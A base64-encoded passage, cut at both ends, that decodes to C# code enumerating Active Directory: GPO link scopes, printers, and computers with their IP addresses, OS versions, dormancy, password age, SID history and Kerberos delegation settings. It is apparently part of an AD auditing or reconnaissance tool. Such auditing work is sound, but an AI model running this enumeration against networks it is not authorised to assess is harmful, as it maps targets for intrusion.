ZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJPVT0iIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKSkuTGVuZ3RoIC0xKTsKICAgICAgICAgICAgICAgICAgICBpZiAoQWRTT00uUHJvcGVydGllc1siZ1BPcHRpb25zIl0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoaW50KSBBZFNPTS5Qcm9wZXJ0aWVzWyJnUE9wdGlvbnMiXVswXSA9PSAxKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCbG9ja0luaGVyaXRhbmNlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB2YXIgR1BMaW5rcyA9IGdQTGluay5TcGxpdCgnXScsICdbJykuV2hlcmUoeCA9PiB4LlN0YXJ0c1dpdGgoIkxEQVAiKSk7CiAgICAgICAgICAgICAgICAgICAgaW50IE9yZGVyID0gKEdQTGlua3MuVG9BcnJheSgpKS5MZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgaWYgKE9yZGVyID09IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBTT01PYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIEFkU09NLlByb3BlcnRpZXNbIm5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXB0aCIsIERlcHRoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRpc3Rpbmd1aXNoZWROYW1lIiwgQWRTT00uUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMaW5rIE9yZGVyIiwgbnVsbCkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHUE8iLCBHUE9OYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkVuZm9yY2VkIiwgRW5mb3JjZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGluayBFbmFibGVkIiwgTGlua0VuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQmxvY2tJbmhlcml0YW5jZSIsIEJsb2NrSW5oZXJpdGFuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiZ1BMaW5rIiwgZ1BMaW5rKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoImdQT3B0aW9ucyIsIChBZFNPTS5Qcm9wZXJ0aWVzWyJncG9wdGlvbnMiXS5Db3VudCAhPSAwID8gQWRTT00uUHJvcGVydGllc1siZ3BvcHRpb25zIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09Nc0xpc3QuQWRkKCBTT01PYmogKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoU3RyaW5nIGxpbmsgaW4gR1BMaW5rcykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZ1tdIGxpbmtzcGxpdCA9IGxpbmsuU3BsaXQoJy8nLCAnOycpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUNvbnZlcnQuVG9Cb29sZWFuKChDb252ZXJ0LlRvSW50MzIobGlua3NwbGl0WzNdKSAmIDEpKSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTGlua0VuYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTGlua0VuYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoQ29udmVydC5Ub0Jvb2xlYW4oKENvbnZlcnQuVG9JbnQzMihsaW5rc3BsaXRbM10pICYgMikpKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmZvcmNlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmZvcmNlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIEdQT05hbWUgPSBMREFQQ2xhc3MuQWRHUE9EaWN0aW9uYXJ5LkNvbnRhaW5zS2V5KGxpbmtzcGxpdFsyXS5Ub1VwcGVyKCkpID8gTERBUENsYXNzLkFkR1BPRGljdGlvbmFyeVtsaW5rc3BsaXRbMl0uVG9VcHBlcigpXSA6IGxpbmtzcGxpdFsyXS5TcGxpdCgnPScsJywnKVsxXTsKICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgU09NT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBBZFNPTS5Qcm9wZXJ0aWVzWyJuYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVwdGgiLCBEZXB0aCkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIEFkU09NLlByb3BlcnRpZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGluayBPcmRlciIsIE9yZGVyKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdQTyIsIEdQT05hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRW5mb3JjZWQiLCBFbmZvcmNlZCkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMaW5rIEVuYWJsZWQiLCBMaW5rRW5hYmxlZCkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJCbG9ja0luaGVyaXRhbmNlIiwgQmxvY2tJbmhlcml0YW5jZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJnUExpbmsiLCBnUExpbmspKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiZ1BPcHRpb25zIiwgKEFkU09NLlByb3BlcnRpZXNbImdwb3B0aW9ucyJdLkNvdW50ICE9IDAgPyBBZFNPTS5Qcm9wZXJ0aWVzWyJncG9wdGlvbnMiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01zTGlzdC5BZGQoIFNPTU9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICBPcmRlci0tOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gU09Nc0xpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBQcmludGVyUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBTZWFyY2hSZXN1bHQgQWRQcmludGVyID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwoKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBQcmludGVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBBZFByaW50ZXIuUHJvcGVydGllc1siTmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZlck5hbWUiLCBBZFByaW50ZXIuUHJvcGVydGllc1sic2VydmVyTmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNoYXJlTmFtZSIsIEFkUHJpbnRlci5Qcm9wZXJ0aWVzWyJwcmludFNoYXJlTmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRyaXZlck5hbWUiLCBBZFByaW50ZXIuUHJvcGVydGllc1siZHJpdmVyTmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRyaXZlclZlcnNpb24iLCBBZFByaW50ZXIuUHJvcGVydGllc1siZHJpdmVyVmVyc2lvbiJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBvcnROYW1lIiwgQWRQcmludGVyLlByb3BlcnRpZXNbInBvcnROYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBQcmludGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVVJMIiwgQWRQcmludGVyLlByb3BlcnRpZXNbInVybCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DcmVhdGVkIiwgQWRQcmludGVyLlByb3BlcnRpZXNbIndoZW5DcmVhdGVkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBQcmludGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNoYW5nZWQiLCBBZFByaW50ZXIuUHJvcGVydGllc1sid2hlbkNoYW5nZWQiXVswXSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IFByaW50ZXJPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgQ29tcHV0ZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFNlYXJjaFJlc3VsdCBBZENvbXB1dGVyID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIGJvb2wgRG9ybWFudCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IEVuYWJsZWQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2wgUGFzc3dvcmROb3RDaGFuZ2VkYWZ0ZXJNYXhBZ2UgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBib29sPyBUcnVzdGVkZm9yRGVsZWdhdGlvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gVHJ1c3RlZHRvQXV0aGZvckRlbGVnYXRpb24gPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBEZWxlZ2F0aW9uVHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25Qcm90b2NvbCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25TZXJ2aWNlcyA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIFN0cklQQWRkcmVzcyA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgaW50PyBEYXlzU2luY2VMYXN0TG9nb24gPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGludD8gRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBEYXRlVGltZT8gTGFzdExvZ29uRGF0ZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgRGF0ZVRpbWU/IFBhc3N3b3JkTGFzdFNldCA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgIGlmIChBZENvbXB1dGVyLlByb3BlcnRpZXNbImRuc2hvc3RuYW1lIl0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJJUEFkZHJlc3MgPSBDb252ZXJ0LlRvU3RyaW5nKERucy5HZXRIb3N0RW50cnkoQ29udmVydC5Ub1N0cmluZyhBZENvbXB1dGVyLlByb3BlcnRpZXNbImRuc2hvc3RuYW1lIl1bMF0pKS5BZGRyZXNzTGlzdFswXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RySVBBZGRyZXNzID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvLyBXaGVuIHRoZSB1c2VyIGlzIG5vdCBhbGxvd2VkIHRvIHF1ZXJ5IHRoZSBVc2VyQWNjb3VudENvbnRyb2wgYXR0cmlidXRlLgogICAgICAgICAgICAgICAgICAgIGlmIChBZENvbXB1dGVyLlByb3BlcnRpZXNbInVzZXJhY2NvdW50Y29udHJvbCJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgdXNlckZsYWdzID0gKFVBQ0ZsYWdzKSBBZENvbXB1dGVyLlByb3BlcnRpZXNbInVzZXJhY2NvdW50Y29udHJvbCJdWzBdOwogICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gISgodXNlckZsYWdzICYgVUFDRmxhZ3MuQUNDT1VOVERJU0FCTEUpID09IFVBQ0ZsYWdzLkFDQ09VTlRESVNBQkxFKTsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ1c3RlZGZvckRlbGVnYXRpb24gPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuVFJVU1RFRF9GT1JfREVMRUdBVElPTikgPT0gVUFDRmxhZ3MuVFJVU1RFRF9GT1JfREVMRUdBVElPTjsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ1c3RlZHRvQXV0aGZvckRlbGVnYXRpb24gPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuVFJVU1RFRF9UT19BVVRIRU5USUNBVEVfRk9SX0RFTEVHQVRJT04pID09IFVBQ0ZsYWdzLlRSVVNURURfVE9fQVVUSEVOVElDQVRFX0ZPUl9ERUxFR0FUSU9OOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJsYXN0bG9nb250aW1lc3RhbXAiXS5Db3VudCAhPSAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgTGFzdExvZ29uRGF0ZSA9IERhdGVUaW1lLkZyb21GaWxlVGltZSgobG9uZykoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJsYXN0bG9nb250aW1lc3RhbXAiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBEYXlzU2luY2VMYXN0TG9nb24gPSBNYXRoLkFicygoRGF0ZTEgLSAoRGF0ZVRpbWUpTGFzdExvZ29uRGF0ZSkuRGF5cyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChEYXlzU2luY2VMYXN0TG9nb24gPiBEb3JtYW50VGltZVNwYW4pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERvcm1hbnQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChBZENvbXB1dGVyLlByb3BlcnRpZXNbInB3ZGxhc3RzZXQiXS5Db3VudCAhPSAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFzc3dvcmRMYXN0U2V0ID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZENvbXB1dGVyLlByb3BlcnRpZXNbInB3ZGxhc3RzZXQiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBEYXlzU2luY2VMYXN0UGFzc3dvcmRDaGFuZ2UgPSBNYXRoLkFicygoRGF0ZTEgLSAoRGF0ZVRpbWUpUGFzc3dvcmRMYXN0U2V0KS5EYXlzKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKERheXNTaW5jZUxhc3RQYXNzd29yZENoYW5nZSA+IFBhc3NNYXhBZ2UpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkTm90Q2hhbmdlZGFmdGVyTWF4QWdlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoICgoYm9vbCkgVHJ1c3RlZGZvckRlbGVnYXRpb24pICYmICgoaW50KSBBZENvbXB1dGVyLlByb3BlcnRpZXNbInByaW1hcnlncm91cGlkIl1bMF0gPT0gNTE1KSApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uVHlwZSA9ICJVbmNvbnN0cmFpbmVkIjsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblNlcnZpY2VzID0gIkFueSI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChBZENvbXB1dGVyLlByb3BlcnRpZXNbIm1zRFMtQWxsb3dlZFRvRGVsZWdhdGVUbyJdLkNvdW50ID49IDEpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uVHlwZSA9ICJDb25zdHJhaW5lZCI7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iXS5Db3VudDsgaSsrKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZGVsZWdhdGV0byA9IEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibXNEUy1BbGxvd2VkVG9EZWxlZ2F0ZVRvIl1baV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSBEZWxlZ2F0aW9uU2VydmljZXMgKyAiLCIgKyBDb252ZXJ0LlRvU3RyaW5nKGRlbGVnYXRldG8pOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25TZXJ2aWNlcyA9IERlbGVnYXRpb25TZXJ2aWNlcy5UcmltU3RhcnQoJywnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKChib29sKSBUcnVzdGVkdG9BdXRoZm9yRGVsZWdhdGlvbikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25Qcm90b2NvbCA9ICJBbnkiOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChEZWxlZ2F0aW9uVHlwZSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblByb3RvY29sID0gIktlcmJlcm9zIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIFNJREhpc3RvcnkgPSAiIjsKICAgICAgICAgICAgICAgICAgICBpZiAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJzaWRoaXN0b3J5Il0uQ291bnQgPj0gMSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBzaWRzID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJzaWRoaXN0b3J5Il0uQ291bnQ7IGkrKykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGhpc3RvcnkgPSBBZENvbXB1dGVyLlByb3BlcnRpZXNbInNpZGhpc3RvcnkiXVtpXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpZHMgPSBzaWRzICsgIiwiICsgQ29udmVydC5Ub1N0cmluZyhuZXcgU2VjdXJpdHlJZGVudGlmaWVyKChieXRlW10paGlzdG9yeSwgMCkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIFNJREhpc3RvcnkgPSBzaWRzLlRyaW1TdGFydCgnLCcpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgT3BlcmF0aW5nU3lzdGVtID0gQ2xlYW5TdHJpbmcoKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sib3BlcmF0aW5nc3lzdGVtIl0uQ291bnQgIT0gMCA/IEFkQ29tcHV0ZXIuUHJvcGVydGllc1sib3BlcmF0aW5nc3lzdGVtIl1bMF0gOiAiLSIpICsgIiAiICsgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sib3BlcmF0aW5nc3lzdGVtaG90Zml4Il0uQ291bnQgIT0gMCA/IEFkQ29tcHV0ZXIuUHJvcGVydGllc1sib3BlcmF0aW5nc3lzdGVtaG90Zml4Il1bMF0gOiAiICIpICsgIiAiICsgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sib3BlcmF0aW5nc3lzdGVtc2VydmljZXBhY2siXS5Db3VudCAhPSAwID8gQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJvcGVyYXRpbmdzeXN0ZW1zZXJ2aWNlcGFjayJdWzBdIDogIiAiKSArICIgIiArIChBZENvbXB1dGVyLlByb3BlcnRpZXNbIm9wZXJhdGluZ3N5c3RlbXZlcnNpb24iXS5Db3VudCAhPSAwID8gQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJvcGVyYXRpbmdzeXN0ZW12ZXJzaW9uIl1bMF0gOiAiICIpKTsKCiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQ29tcHV0ZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJuYW1lIl0uQ291bnQgIT0gMCA/IEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibmFtZSJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJETlNIb3N0TmFtZSIsIChBZENvbXB1dGVyLlByb3BlcnRpZXNbImRuc2hvc3RuYW1lIl0uQ291bnQgIT0gMCA/IEFkQ29tcHV0ZXIuUHJvcGVydGllc1siZG5zaG9zdG5hbWUiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRW5hYmxlZCIsIEVuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIklQdjRBZGRyZXNzIiwgU3RySVBBZGRyZXNzKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPcGVyYXRpbmcgU3lzdGVtIiwgT3BlcmF0aW5nU3lzdGVtKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMb2dvbiBBZ2UgKGRheXMpIiwgRGF5c1NpbmNlTGFzdExvZ29uKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBBZ2UgKGRheXMpIiwgRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEb3JtYW50ICg+ICIgKyBEb3JtYW50VGltZVNwYW4gKyAiIGRheXMpIiwgRG9ybWFudCkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgQWdlICg+ICIgKyBQYXNzTWF4QWdlICsgIiBkYXlzKSIsIFBhc3N3b3JkTm90Q2hhbmdlZGFmdGVyTWF4QWdlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFR5cGUiLCBEZWxlZ2F0aW9uVHlwZSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVsZWdhdGlvbiBQcm90b2NvbCIsIERlbGVnYXRpb25Qcm90b2NvbCkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVsZWdhdGlvbiBTZXJ2aWNlcyIs